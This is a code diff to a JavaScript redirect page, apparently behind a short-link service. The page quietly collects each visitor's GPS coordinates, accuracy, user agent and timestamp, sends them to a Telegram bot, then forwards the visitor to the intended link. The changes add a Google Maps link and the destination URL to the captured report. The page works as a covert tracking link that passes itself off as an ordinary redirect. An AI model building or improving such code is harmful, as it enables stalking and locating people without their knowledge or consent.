@@ -7,11 +7,27 @@ const shortCode = window.location.pathname.split("/").pop();
 function sendLogAndRedirect(url) {
   navigator.geolocation.getCurrentPosition(
     pos => {
-      const msg = `📍 *Visitor*\n🌍 ${pos.coords.latitude}, ${pos.coords.longitude} (±${pos.coords.accuracy}m)\n📱 ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}\n🔗 Kode: ${shortCode}`;
+      const lat = pos.coords.latitude.toFixed(6);
+      const lon = pos.coords.longitude.toFixed(6);
+      const acc = Math.round(pos.coords.accuracy);
+      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+      const msg = `📍 *Visitor*\n` +
+                  `🌍 ${lat}, ${lon} (±${acc}m)\n` +
+                  `🗺️ [Lihat di Google Maps](${mapLink})\n` +
+                  `📱 ${navigator.userAgent}\n` +
+                  `🕒 ${new Date().toLocaleString("id-ID")}\n` +
+                  `🔗 Kode: ${shortCode}\n` +
+                  `➡️ Link: ${url}`;
+
       sendToTelegram(msg, url);
     },
     () => {
-      const msg = `📍 *Visitor (No Location)*\n📱 ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}\n🔗 Kode: ${shortCode}`;
+      const msg = `📍 *Visitor (No Location)*\n` +
+                  `📱 ${navigator.userAgent}\n` +
+                  `🕒 ${new Date().toLocaleString("id-ID")}\n` +
+                  `🔗 Kode: ${shortCode}\n` +
+                  `➡️ Link: ${url}`;
       sendToTelegram(msg, url);
     }
   );
@@ -22,7 +38,11 @@ function sendToTelegram(message, redirectUrl) {
   fetch(apiUrl, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "Markdown"
+    })
   }).finally(() => window.location.href = redirectUrl);
 }
 
